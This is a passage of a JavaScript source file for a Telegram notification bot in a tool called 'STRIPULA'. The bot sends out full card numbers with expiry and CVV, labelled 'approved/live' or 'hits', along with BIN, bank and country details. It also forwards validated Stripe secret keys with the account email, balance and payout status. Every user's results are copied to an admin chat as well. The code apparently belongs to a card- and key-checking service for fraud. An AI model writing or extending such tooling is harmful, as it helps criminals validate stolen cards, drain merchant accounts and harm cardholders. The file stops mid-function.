import axios from 'axios';

/**
 * Telegram Bot Service
 * Sends notifications via Telegram Bot API for approved cards, live SK keys, etc.
 * 
 * Sends to:
 * 1. User who performed the action (via their telegram_id)
 * 2. Admin channel/chat (via TELEGRAM_ADMIN_CHAT_ID)
 * 
 * Rate limiting:
 * - Telegram limits ~30 messages/second to same chat
 * - ~20 different chats/minute for bots
 * - Queue processes messages with delays to avoid 429 errors
 */
export class TelegramBotService {
    constructor(options = {}) {
        this.botToken = options.botToken || process.env.TELEGRAM_BOT_TOKEN;
        this.adminChatId = options.adminChatId || process.env.TELEGRAM_ADMIN_CHAT_ID;
        this.enabled = !!this.botToken;
        this.baseUrl = `https://api.telegram.org/bot${this.botToken}`;
        
        // Message queue for rate limiting - no dropping, accept delays
        this.messageQueue = [];
        this.isProcessing = false;
        this.retryAfter = 0;
        this.minDelay = options.minDelay || 1500;  // 1.5s delay between messages to avoid rate limits
    }

    /**
     * Add message to queue for rate-limited sending
     * Messages are never dropped - they will be sent eventually
     * @param {string|number} chatId - Telegram chat ID
     * @param {string} text - Message text
     * @param {Object} options - Additional options
     */
    queueMessage(chatId, text, options = {}) {
        if (!this.enabled || !chatId) return;
        
        this.messageQueue.push({ chatId, text, options, retries: 0, queuedAt: Date.now() });
        this._processQueue();
    }

    /**
     * Process message queue with rate limiting
     * Will wait for rate limit cooldowns - no messages lost
     * @private
     */
    async _processQueue() {
        if (this.isProcessing || this.messageQueue.length === 0) return;
        
        this.isProcessing = true;
        
        while (this.messageQueue.length > 0) {
            // Wait if we're rate limited
            if (this.retryAfter > 0) {
                const waitTime = this.retryAfter * 1000;
                console.log(`[TelegramBot] Rate limited, waiting ${this.retryAfter}s (${this.messageQueue.length} messages queued)`);
                await this._sleep(waitTime);
                this.retryAfter = 0;
            }
            
            const msg = this.messageQueue.shift();
            if (!msg) break;
            
            const result = await this._sendMessageDirect(msg.chatId, msg.text, msg.options);
            
            // Handle rate limit response
            if (result.rateLimited) {
                this.retryAfter = result.retryAfter || 30;
                // Put message back at front of queue for retry (unlimited retries)
                msg.retries++;
                this.messageQueue.unshift(msg);
                continue; // Don't add delay, we'll wait for retryAfter
            }
            
            // Delay between messages to avoid hitting rate limits
            await this._sleep(this.minDelay);
        }
        
        this.isProcessing = false;
    }

    /**
     * Sleep helper
     * @private
     */
    _sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    /**
     * Direct send without queue (used internally)
     * @private
     */
    async _sendMessageDirect(chatId, text, options = {}) {
        try {
            const response = await axios.post(`${this.baseUrl}/sendMessage`, {
                chat_id: chatId,
                text,
                parse_mode: options.parseMode || 'HTML',
                disable_web_page_preview: options.disablePreview ?? true,
                ...options
            }, {
                timeout: 10000
            });

            return { success: true, data: response.data };
        } catch (error) {
            const errorMsg = error.response?.data?.description || error.message;
            const statusCode = error.response?.status;
            
            // Handle rate limiting (429 Too Many Requests)
            if (statusCode === 429) {
                const retryAfter = error.response?.data?.parameters?.retry_after || 30;
                console.warn(`[TelegramBot] Rate limited, retry after ${retryAfter}s`);
                return { success: false, error: errorMsg, rateLimited: true, retryAfter };
            }
            
            console.error(`[TelegramBot] Failed to send message: ${errorMsg}`);
            return { success: false, error: errorMsg };
        }
    }

    /**
     * Send a message via Telegram Bot API (queued for rate limiting)
     * For immediate sending, use _sendMessageDirect
     * @param {string|number} chatId - Telegram chat ID
     * @param {string} text - Message text (supports HTML)
     * @param {Object} options - Additional options
     */
    sendMessage(chatId, text, options = {}) {
        this.queueMessage(chatId, text, options);
    }

    /**
     * Notify about an approved/live card
     * @param {Object} params
     * @param {Object} params.user - User object with telegram_id, first_name
     * @param {Object} params.result - Validation result
     * @param {string} params.gateway - Gateway name
     * @param {string} params.type - Validation type (auth, charge, shopify)
     */
    async notifyCardApproved({ user, result, gateway, type }) {
        if (!this.enabled) return;

        // Handle card as string or object
        let card = result.fullCard || result.card || 'N/A';
        if (typeof card === 'object' && card !== null) {
            const num = card.number || card.cardNumber || '';
            const mm = card.expMonth || card.exp_month || card.month || '';
            const yy = card.expYear || card.exp_year || card.year || '';
            const cvv = card.cvc || card.cvv || card.securityCode || '';
            card = [num, mm, yy, cvv].filter(Boolean).join('|');
        }
        const status = result.status || 'APPROVED';
        const bin = result.binData;

        // Format BIN info
        const brand = bin?.scheme || bin?.brand || 'Unknown';
        const cardType = bin?.type || 'Unknown';
        const category = bin?.category || '';
        const bank = bin?.bank || 'Unknown';
        const country = bin?.country || 'Unknown';
        const countryCode = bin?.countryCode || '';
        const countryFlag = bin?.countryEmoji || this._getCountryFlag(countryCode);
        const binNumber = card?.substring(0, 6) || 'N/A';
        const prepaid = bin?.prepaid;

        // Get user info with tier display
        const userName = user?.first_name || 'User';
        const tierDisplay = this._formatTierDisplay(user?.tier, user?.tier_expires_at);

        // Gateway display name
        const gatewayDisplay = this._formatGatewayName(gateway, type);

        // Status styling
        const statusEmoji = status === 'APPROVED' ? '✅' : status === 'LIVE' ? '💚' : '✓';
        
        // Brand emoji
        const brandEmoji = this._getBrandEmoji(brand);
        
        // Card type with prepaid indicator
        const typeDisplay = prepaid ? `${cardType} • PREPAID` : cardType;
        
        // Timestamp
        const timestamp = new Date().toLocaleString('en-US', { 
            timeZone: 'UTC',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });
        
        // Modern Design
        const formattedMessage = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
${statusEmoji} <b>${status}</b>  │  <b>STRIPULA</b>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

💳 <b>CARD</b>
<code>${card}</code>

┌─────────────────────
│ ${brandEmoji} <b>Brand:</b>  ${brand.toUpperCase()}
│ 📋 <b>Type:</b>   ${typeDisplay.toUpperCase()}
│ 🏷️ <b>Level:</b>  ${(category || 'STANDARD').toUpperCase()}
│ 🔢 <b>BIN:</b>    ${binNumber}
├─────────────────────
│ 🏦 <b>Bank:</b>
│    ${bank}
├─────────────────────
│ ${countryFlag} <b>Region:</b>
│    ${country}${countryCode ? ` (${countryCode})` : ''}
└─────────────────────

⚡ <b>Gateway:</b> ${gatewayDisplay}
👤 <b>User:</b> ${userName}
${tierDisplay}
🕐 <b>Time:</b> ${timestamp} UTC

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀
`.trim();

        // Queue messages (non-blocking)
        if (user?.telegram_id) {
            this.sendMessage(user.telegram_id, formattedMessage);
        }
        if (this.adminChatId) {
            this.sendMessage(this.adminChatId, formattedMessage);
        }
    }

    /**
     * Notify about a batch of approved/live cards
     * Sends ALL cards chunked into multiple messages (accepts rate limit delays)
     * Each message stays under Telegram's 4096 char limit
     * @param {Object} params
     * @param {Object} params.user - User object with telegram_id, first_name
     * @param {Array} params.results - Array of approved/live validation results
     * @param {string} params.gateway - Gateway name
     * @param {string} params.type - Validation type (auth, charge, shopify)
     * @param {Object} params.stats - Batch stats { total, approved, declined, errors }
     */
    notifyBatchSummary({ user, results, gateway, type, stats = {} }) {
        if (!this.enabled || !results || results.length === 0) return;

        const userName = user?.first_name || 'User';
        const tierDisplay = this._formatTierDisplay(user?.tier, user?.tier_expires_at);
        const gatewayDisplay = this._formatGatewayName(gateway, type);
        
        const timestamp = new Date().toLocaleString('en-US', { 
            timeZone: 'UTC',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });

        const totalHits = results.length;

        // Stats summary
        const statsLine = stats.total 
            ? `📊 ${totalHits}/${stats.total} hits (${stats.declined || 0} dead, ${stats.errors || 0} err)`
            : `📊 ${totalHits} hits`;

        // Format single card entry (~150-200 chars each)
        const formatCard = (result, index) => {
            // Handle card as string or object
            let card = result.fullCard || result.card || 'N/A';
            if (typeof card === 'object' && card !== null) {
                // Format card object: number|mm|yy|cvv
                const num = card.number || card.cardNumber || '';
                const mm = card.expMonth || card.exp_month || card.month || '';
                const yy = card.expYear || card.exp_year || card.year || '';
                const cvv = card.cvc || card.cvv || card.securityCode || '';
                card = [num, mm, yy, cvv].filter(Boolean).join('|');
            }
            const status = result.status || 'APPROVED';
            const bin = result.binData;
            
            const brand = bin?.scheme || bin?.brand || '?';
            const cardType = bin?.type || '';
            const category = bin?.category || '';
            const bank = bin?.bank || '';
            const countryCode = bin?.countryCode || '';
            const countryFlag = bin?.countryEmoji || this._getCountryFlag(countryCode);
            const prepaid = bin?.prepaid;
            
            const statusEmoji = status === 'APPROVED' ? '✅' : status === 'LIVE' ? '💚' : '✓';
            const brandEmoji = this._getBrandEmoji(brand);
            
            const binParts = [
                `${brandEmoji}${brand.toUpperCase()}`,
                cardType ? cardType.toUpperCase() : null,
                prepaid ? 'PREPAID' : null,
                category ? category.toUpperCase() : null,
                `${countryFlag}${countryCode}`
            ].filter(Boolean).join('│');
            
            const bankInfo = bank && bank.length < 25 ? ` 🏦${bank}` : '';
            
            return `${index + 1}. ${statusEmoji}<code>${card}</code>\n   ${binParts}${bankInfo}`;
        };

        // Chunk cards to stay under 4096 chars (~12-15 cards per message)
        const CARDS_PER_CHUNK = 12;
        const totalChunks = Math.ceil(results.length / CARDS_PER_CHUNK);
        
        for (let chunkIdx = 0; chunkIdx < totalChunks; chunkIdx++) {
            const start = chunkIdx * CARDS_PER_CHUNK;
            const end = Math.min(start + CARDS_PER_CHUNK, results.length);
            const chunk = results.slice(start, end);
            
            const cardsList = chunk.map((result, idx) => 
                formatCard(result, start + idx)
            ).join('\n');

            const isFirst = chunkIdx === 0;
            const isLast = chunkIdx === totalChunks - 1;
            const chunkLabel = totalChunks > 1 ? ` [${chunkIdx + 1}/${totalChunks}]` : '';

            let message;
            if (totalChunks === 1) {
                // Single message - full format
                message = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🎯 <b>BATCH HITS</b>  │  <b>STRIPULA</b>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

${cardsList}

┌─────────────────────
│ ${statsLine}
│ ⚡ ${gatewayDisplay}
│ 👤 ${userName} ${tierDisplay}
│ 🕐 ${timestamp} UTC
└─────────────────────
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀`.trim();
            } else if (isFirst) {
                // First chunk - header
                message = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🎯 <b>BATCH HITS</b>${chunkLabel}  │  <b>STRIPULA</b>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

${cardsList}`.trim();
            } else if (isLast) {
                // Last chunk - footer
                message = `
📋 <b>HITS</b>${chunkLabel}

${cardsList}

┌─────────────────────
│ ${statsLine}
│ ⚡ ${gatewayDisplay}
│ 👤 ${userName} ${tierDisplay}
│ 🕐 ${timestamp} UTC
└─────────────────────
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀`.trim();
            } else {
                // Middle chunk - minimal
                message = `
📋 <b>HITS</b>${chunkLabel}

${cardsList}`.trim();
            }

            // Queue message - will be sent with rate limit delays
            if (user?.telegram_id) {
                this.sendMessage(user.telegram_id, message);
            }
            if (this.adminChatId) {
                this.sendMessage(this.adminChatId, message);
            }
        }
    }

    /**
     * Notify about a live SK key
     * @param {Object} params
     * @param {Object} params.user - User object with telegram_id, first_name
     * @param {Object} params.result - SK check result
     * @param {boolean} params.isManualInput - Whether key was manually input
     */
    async notifyLiveSK({ user, result, isManualInput = false }) {
        if (!this.enabled) return;

        const key = result.fullKey || result.key || 'N/A';
        const status = result.status || 'LIVE';
        // Support both 'balance' and 'availableBalance' field names
        const balance = result.balance ?? result.availableBalance;
        const pendingBalance = result.pendingBalance;
        const currency = result.currency || result.defaultCurrency || 'USD';
        const currencySymbol = result.currencySymbol || this._getCurrencySymbol(currency);
        const accountName = result.accountName || result.account_name || 'N/A';
        const accountEmail = result.accountEmail || 'N/A';
        const accountId = result.accountId || 'N/A';
        const country = result.country || 'N/A';
        const countryFlag = result.countryFlag || '';
        const countryName = result.countryName || country;
        const chargesEnabled = result.chargesEnabled;
        const payoutsEnabled = result.payoutsEnabled;
        const pkKey = result.pkKey;
        const livemode = result.livemode;
        const capabilities = result.capabilities || {};

        // Get user info with tier display
        const userName = user?.first_name || 'User';
        const tierDisplay = this._formatTierDisplay(user?.tier, user?.tier_expires_at);

        // Status emoji based on balance status
        let statusEmoji = '🟢';
        let statusLabel = status;
        if (status === 'LIVE+') {
            statusEmoji = '💰';
            statusLabel = 'LIVE+';
        } else if (status === 'LIVE0') {
            statusEmoji = '⚖️';
            statusLabel = 'LIVE0';
        } else if (status === 'LIVE-') {
            statusEmoji = '📉';
            statusLabel = 'LIVE-';
        }

        // Mode indicator
        const modeIndicator = livemode === true ? '🟢 PROD' : livemode === false ? '🧪 TEST' : '';

        // Balance section
        let balanceSection = ' 💵 Balance unavailable';
        if (balance !== undefined && balance !== null) {
            const balanceAmount = (balance / 100).toFixed(2);
            balanceSection = ` 💵 ${currencySymbol}${balanceAmount} ${currency}`;
            
            if (pendingBalance !== undefined && pendingBalance !== null && pendingBalance !== 0) {
                const pendingAmount = (pendingBalance / 100).toFixed(2);
                balanceSection += `\n ⏳ ${currencySymbol}${pendingAmount} pending`;
            }
        }

        // Capabilities grid (2x2)
        const caps = [];
        if (chargesEnabled !== undefined) {
            caps.push(`${chargesEnabled ? '✅' : '❌'} Charges`);
        }
        if (payoutsEnabled !== undefined) {
            caps.push(`${payoutsEnabled ? '✅' : '❌'} Payouts`);
        }
        if (capabilities.cardPayments !== undefined) {
            caps.push(`${capabilities.cardPayments ? '✅' : '❌'} Cards`);
        }
        if (capabilities.transfers !== undefined) {
            caps.push(`${capabilities.transfers ? '✅' : '❌'} Transfers`);
        }
        
        // Format capabilities in 2 columns
        let capsSection = '';
        if (caps.length > 0) {
            const col1 = caps.filter((_, i) => i % 2 === 0);
            const col2 = caps.filter((_, i) => i % 2 === 1);
            capsSection = col1.map((c, i) => ` ${c}${col2[i] ? `  ${col2[i]}` : ''}`).join('\n');
        }

        // PK Key section
        const pkSection = pkKey ? `\n ────────────────────────────\n 🔓 <code>${pkKey}</code>` : '';

        const inputMethod = isManualInput ? 'Manual' : 'Batch';

        // Timestamp
        const timestamp = new Date().toLocaleString('en-US', { 
            timeZone: 'UTC',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });

        // Modern Design for SK Keys
        const formattedMessage = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
${statusEmoji} <b>${statusLabel}</b>  │  <b>STRIPULA</b>${modeIndicator ? `  │  ${modeIndicator}` : ''}
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔐 <b>SECRET KEY</b>
<code>${key}</code>

┌─────────────────────
│ 🏢 <b>Account:</b>
│    ${accountName}
│ 📧 <b>Email:</b>
│    ${accountEmail}
│ 🆔 <b>ID:</b>
│    <code>${accountId}</code>
│ ${countryFlag} <b>Region:</b>
│    ${countryName}
├─────────────────────
│ 💰 <b>BALANCE</b>
│${balanceSection.split('\n').map(l => '    ' + l.trim()).join('\n│')}
├─────────────────────
│ ⚙️ <b>CAPABILITIES</b>
${capsSection.split('\n').map(l => '│    ' + l.trim()).join('\n')}${pkSection ? `
├─────────────────────
│ 🔓 <b>PUBLIC KEY</b>
│    <code>${pkKey}</code>` : ''}
└─────────────────────

📋 <b>Method:</b> ${inputMethod} Check
👤 <b>User:</b> ${userName}
${tierDisplay}
🕐 <b>Time:</b> ${timestamp} UTC

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀
`.trim();

        // Queue messages (non-blocking)
        if (user?.telegram_id) {
            this.sendMessage(user.telegram_id, formattedMessage);
        }
        if (this.adminChatId) {
            this.sendMessage(this.adminChatId, formattedMessage);
        }
    }

    // ==================== Gateway Health Manual Control Methods ====================
    // Requirements: 2.1, 2.2, 2.3, 2.4, 2.5, 3.2, 3.3, 3.4, 3.5

    /**
     * Send health alert with inline keyboard buttons for manual control
     * 
     * Requirements: 2.1, 2.2, 2.4, 2.5
     * 
     * @param {Object} params
     * @param {string} params.gatewayId - Gateway ID
     * @param {string} params.gatewayLabel - Gateway display label
     * @param {string} params.currentStatus - Current health status
     * @param {Object} params.metrics - Health metrics { consecutiveFailures, successRate, lastError }
     * @param {string} params.reason - Alert reason
     * @returns {Promise<Object>} Result with success flag and message data
     */
    async sendHealthAlert({ gatewayId, gatewayLabel, currentStatus, metrics, reason }) {
        if (!this.enabled || !this.adminChatId) {
            return { success: false, error: 'Bot not enabled or no admin chat ID' };
        }

        const statusEmoji = {
            'online': '🟢',
            'degraded': '🟡', 
            'offline': '🔴'
        };

        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'UTC',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });

        const message = `
⚠️ <b>Gateway Health Alert</b>
━━━━━━━━━━━━━━━━━━━━━━━

🔗 <b>Gateway:</b> ${gatewayLabel} (<code>${gatewayId}</code>)
📊 <b>Current Status:</b> ${statusEmoji[currentStatus] || '⚪'} ${(currentStatus || 'unknown').toUpperCase()}

📈 <b>Metrics (last 50 requests):</b>
• Success Rate: ${metrics?.successRate ?? 'N/A'}%
• Consecutive Failures: ${metrics?.consecutiveFailures ?? 'N/A'}
• Last Error: ${metrics?.lastError || 'N/A'}

📝 <b>Alert Reason:</b> ${reason || 'Threshold exceeded'}

⏰ <b>Time:</b> ${timestamp} UTC
`.trim();

        // Inline keyboard with action buttons
        // callback_data must be JSON string, max 64 bytes
        const inlineKeyboard = {
            inline_keyboard: [
                [
                    { 
                        text: '🔴 Mark Offline', 
                        callback_data: JSON.stringify({ action: 'set_health', gateway_id: gatewayId, status: 'offline' }) 
                    },
                    { 
                        text: '🟡 Mark Degraded', 
                        callback_data: JSON.stringify({ action: 'set_health', gateway_id: gatewayId, status: 'degraded' }) 
                    }
                ],
                [
                    { 
                        text: '✅ Dismiss', 
                        callback_data: JSON.stringify({ action: 'dismiss_alert', gateway_id: gatewayId }) 
                    }
                ]
            ]
        };

        return this._sendMessageDirect(this.adminChatId, message, {
            reply_markup: inlineKeyboard
        });
    }

    /**
     * Send recovery notification (informational only, no buttons)
     * 
     * Requirements: 2.3
     * 
     * @param {Object} params
     * @param {string} params.gatewayId - Gateway ID
     * @param {string} params.gatewayLabel - Gateway display label
     * @param {string} params.currentStatus - Current health status
     * @returns {Promise<Object>} Result with success flag
     */
    async sendRecoveryNotification({ gatewayId, gatewayLabel, currentStatus }) {
        if (!this.enabled || !this.adminChatId) {
            return { success: false, error: 'Bot not enabled or no admin chat ID' };
        }

        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'UTC',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });

        const message = `
✅ <b>Gateway Recovered</b>
━━━━━━━━━━━━━━━━━━━━━━━

🔗 <b>Gateway:</b> ${gatewayLabel} (<code>${gatewayId}</code>)
📊 <b>Status:</b> 5 consecutive successes detected

⏰ <b>Time:</b> ${timestamp} UTC

<i>No action required - gateway is responding normally.</i>
`.trim();

        return this._sendMessageDirect(this.adminChatId, message);
    }

    /**
     * Edit a message text (used after button click to show confirmation)
     * 
     * Requirements: 3.5
     * 
     * @param {string|number} chatId - Telegram chat ID
     * @param {number} messageId - Message ID to edit
     * @param {string} text - New message text
     * @param {Object} options - Additional options
     * @param {string} options.parseMode - Parse mode (default: HTML)
     * @param {Object} options.reply_markup - New reply markup (use empty inline_keyboard to remove buttons)
     * @returns {Promise<Object>} Result with success flag
     */
    async editMessageText(chatId, messageId, text, options = {}) {
        try {
            const response = await axios.post(`${this.baseUrl}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text,
                parse_mode: options.parseMode || 'HTML',
                reply_markup: options.reply_markup || { inline_keyboard: [] }
            }, { timeout: 10000 });
            return { success: true, data: response.data };
        } catch (error) {
            const errorMsg = error.response?.data?.description || error.message;
            console.error(`[TelegramBot] Failed to edit message: ${errorMsg}`);
            return { success: false, error: errorMsg };
        }
    }

    /**
     * Answer a callback query (acknowledge button click)
     * 
     * Requirements: 3.2, 3.3, 3.4
     * 
     * @param {string} callbackQueryId - Callback query ID from Telegram
     * @param {string} text - Optional text to show as notification (toast)
     * @returns {Promise<Object>} Result with success flag
     */
    async answerCallbackQuery(callbackQueryId, text = null) {
        try {
            await axios.post(`${this.baseUrl}/answerCallbackQuery`, {
                callback_query_id: callbackQueryId,
                text: text || 'Action processed'
            }, { timeout: 10000 });
            return { success: true };
        } catch (error) {
            const errorMsg = error.response?.data?.description || error.message;
            console.error(`[TelegramBot] Failed to answer callback: ${errorMsg}`);
            return { success: false, error: errorMsg };
        }
    }

    // ==================== Legacy Gateway Health Notification ====================

    /**
     * Notify about gateway health status changes
     * Sends to admin channel only (system notification)
     * 
     * Requirements: 7.1, 7.2, 7.3, 7.4, 7.5
     * 
     * @param {Object} params
     * @param {string} params.gatewayId - Gateway ID
     * @param {string} params.gatewayLabel - Gateway display label
     * @param {string} params.previousStatus - Previous health status
     * @param {string} params.newStatus - New health status
     * @param {string} params.timestamp - ISO timestamp of the change
     * @param {boolean} params.isRecovery - Whether this is a recovery notification
     */
    async notifyGatewayHealth({ gatewayId, gatewayLabel, previousStatus, newStatus, timestamp, isRecovery = false }) {
        if (!this.enabled || !this.adminChatId) return;

        // Format timestamp for display
        const displayTime = new Date(timestamp).toLocaleString('en-US', { 
            timeZone: 'UTC',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });

        // Status emoji and styling
        const statusConfig = {
            'online': { emoji: '🟢', label: 'ONLINE' },
            'degraded': { emoji: '🟡', label: 'DEGRADED' },
            'offline': { emoji: '🔴', label: 'OFFLINE' }
        };

        const prevConfig = statusConfig[previousStatus] || { emoji: '⚪', label: previousStatus?.toUpperCase() || 'UNKNOWN' };
        const newConfig = statusConfig[newStatus] || { emoji: '⚪', label: newStatus?.toUpperCase() || 'UNKNOWN' };

        // Title based on notification type
        let title, headerEmoji;
        if (isRecovery) {
            title = 'GATEWAY RECOVERED';
            headerEmoji = '✅';
        } else if (newStatus === 'offline') {
            title = 'GATEWAY OFFLINE';
            headerEmoji = '🚨';
        } else if (newStatus === 'degraded') {
            title = 'GATEWAY DEGRADED';
            headerEmoji = '⚠️';
        } else {
            title = 'GATEWAY STATUS CHANGE';
            headerEmoji = '📊';
        }

        const formattedMessage = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
${headerEmoji} <b>${title}</b>  │  <b>STRIPULA</b>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔌 <b>Gateway:</b> ${gatewayLabel}
🆔 <b>ID:</b> <code>${gatewayId}</code>

┌─────────────────────
│ 📊 <b>Status Change</b>
│    ${prevConfig.emoji} ${prevConfig.label} → ${newConfig.emoji} ${newConfig.label}
└─────────────────────

🕐 <b>Time:</b> ${displayTime} UTC

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀
`.trim();

        // Send with retry logic (Requirement 7.5)
        const result = await this._sendWithRetry(this.adminChatId, formattedMessage);
        
        if (!result.success) {
            console.error(`[TelegramBot] Failed to send gateway health notification for ${gatewayId}: ${result.error}`);
        }
        
        return result;
    }

    /**
     * Send message with single retry on failure
     * 
     * Requirement: 7.5 - Retry once on failure
     * 
     * @private
     * @param {string|number} chatId - Telegram chat ID
     * @param {string} text - Message text
     * @returns {Promise<Object>} Result object
     */
    async _sendWithRetry(chatId, text) {
        // First attempt
        let result = await this._sendMessageDirect(chatId, text);
        
        if (result.success) {
            return result;
        }

        // If rate limited, don't retry immediately - queue it instead
        if (result.rateLimited) {
            console.warn(`[TelegramBot] Rate limited on gateway health notification, queueing for later`);
            this.queueMessage(chatId, text);
            return { success: true, queued: true };
        }

        // Wait 5 seconds and retry once (Requirement 7.5)
        console.warn(`[TelegramBot] Gateway health notification failed, retrying in 5s...`);
        await this._sleep(5000);
        
        result = await this._sendMessageDirect(chatId, text);
        
        if (!result.success) {
            console.error(`[TelegramBot] Gateway health notification retry failed: ${result.error}`);
        }
        
        return result;
    }

    /**
     * Notify admin only (for system events)
     * @param {string} title - Notification title
     * @param {string} details - Notification details
     */
    async notifyAdmin(title, details) {
        if (!this.enabled || !this.adminChatId) return;

        const timestamp = new Date().toLocaleString('en-US', { 
            timeZone: 'UTC',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            hour12: false
        });
        const message = `
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ <b>SYSTEM</b>  │  <b>STRIPULA</b>
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

📢 <b>${title}</b>

┌─────────────────────
${details.split('\n').map(line => `│ ${line}`).join('\n')}
└─────────────────────

🕐 <b>Time:</b> ${timestamp} UTC

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
        ᴅᴇᴠ ʙʏ <b>Howard</b> 🚀
`.trim();

        this.sendMessage(this.adminChatId, message);
    }

    /**
     * Format gateway name for display
     * Consistent with frontend GATEWAY_LABELS in result-card-parts.jsx
     * @private
     */
    _formatGatewayName(gateway, type) {
        // Direct gateway ID mapping (consistent with frontend)
        const gatewayLabels = {
            // Auth gateways
            'auth-1': 'Auth 1',
            'auth-2': 'Auth 2',
            'auth-3': 'Auth 3',
            // Charge gateways
            'charge-1': 'Charge 1',
            'charge-2': 'Charge 2',
            'charge-3': 'Charge 3',
            // SK-Based gateways
            'skbased-auth-1': 'SK Auth 1',
            'skbased-auth': 'SK Auth',
            'skbased-1': 'SK Charge 1',
            // Auto Shopify
            'auto-shopify-1': 'Auto Shopify',
            // Braintree gateways
            'braintree-auth-1': 'BT Auth 1',
            'braintree-auth-2': 'BT Auth 2',
            'braintree-auth-3': 'BT Auth 3',
            'braintree-charge-1': 'BT Charge 1',
            'braintree-charge-2': 'BT Charge 2',
            'braintree-charge-3': 'BT Charge 3',
            // PayPal gateways
            'paypal-charge-1': 'PayPal 1',
            'paypal-charge-2': 'PayPal 2',
            'paypal-charge-3': 'PayPal 3',
            // Other gateways
            'charge-avs-1': 'AVS Charge 1',
            'square-charge-1': 'Square 1',
        };
        
        // Try direct match first
        if (gateway && gatewayLabels[gateway]) {
            return gatewayLabels[gateway];
        }
        
        // Fallback to type-based naming with version
        const typeMap = {
            'auth': 'Auth',
            'charge': 'Charge',
            'shopify': 'Shopify',
            'skbased': 'SK Charge',
            'skbased-auth': 'SK Auth'
        };
        
        const baseName = typeMap[type] || type?.toUpperCase() || 'Unknown';
        
        // Extract version/number from gateway if present
        const match = gateway?.match(/(\d+)$/);
        const version = match ? ` ${match[1]}` : '';
        
        return `${baseName}${version}`;
    }

    /**
     * Get country flag emoji from country code
     * @private
     */
    _getCountryFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return '🌍';
        
        // Convert country code to flag emoji
        const codePoints = countryCode
            .toUpperCase()
            .split('')
            .map(char => 127397 + char.charCodeAt(0));
        
        return String.fromCodePoint(...codePoints);
    }

    /**
     * Get brand emoji for card networks
     * @private
     */
    _getBrandEmoji(brand) {
        const brandLower = (brand || '').toLowerCase();
        const brandEmojis = {
            'visa': '💳',
            'mastercard': '🔶',
            'amex': '💎',
            'american express': '💎',
            'discover': '🔵',
            'jcb': '🎌',
            'unionpay': '🇨🇳',
            'diners': '🍽️',
            'diners club': '🍽️',
            'maestro': '🎵',
            'elo': '🇧🇷',
            'mir': '🇷🇺'
        };
        return brandEmojis[brandLower] || '💳';
    }

    /**
     * Format tier display with emoji and lifetime info
     * @private
     */
    _formatTierDisplay(tier, tierExpiresAt) {
        const tierLower = (tier || 'free').toLowerCase();
        
        // Tier emoji and styling
        const tierConfig = {
            'free': { emoji: '🆓', label: 'FREE' },
            'basic': { emoji: '⭐', label: 'BASIC' },
            'pro': { emoji: '💫', label: 'PRO' },
            'premium': { emoji: '👑', label: 'PREMIUM' },
            'diamond': { emoji: '💎', label: 'DIAMOND' },
            'vip': { emoji: '🏆', label: 'VIP' }
        };
        
        const config = tierConfig[tierLower] || { emoji: '📋', label: tier?.toUpperCase() || 'FREE' };
        
        // Lifetime display
        let lifetimeDisplay = '';
        if (tierLower === 'free') {
            lifetimeDisplay = '';
        } else if (!tierExpiresAt) {
            // No expiry = permanent
            lifetimeDisplay = ' • ∞ Permanent';
        } else {
            // Has expiry date
            const expiresAt = new Date(tierExpiresAt);
            const now = new Date();
            const daysLeft = Math.ceil((expiresAt - now) / (1000 * 60 * 60 * 24));
            
            if (daysLeft <= 0) {
                lifetimeDisplay = ' • ⚠️ Expired';
            } else if (daysLeft <= 7) {
                lifetimeDisplay = ` • ⏳ ${daysLeft}d left`;
            } else {
                const expiryStr = expiresAt.toLocaleDateString('en-US', {
                    month: 'short',
                    day: '2-digit',
                    year: 'numeric'
                });
                lifetimeDisplay = ` • 📅 ${expiryStr}`;
            }
        }
        
        return `${config.emoji} <b>${config.label}</b>${lifetimeDisplay}`;
    }

    /**
     * Mask SK key for display
     * @private
     */
    _maskKey(key) {
        if (!key || key.length < 15) return key;
        return `${key.substring(0, 7)}...${key.substring(key.length - 4)}`;
    }

    /**
     * Get currency symbol from currency code
     * @private
     */
    _getCurrencySymbol(currency) {
        const symbols = {
            'USD': '$', 'EUR': '€', 'GBP': '£', 'JPY': '¥', 'CNY': '¥',
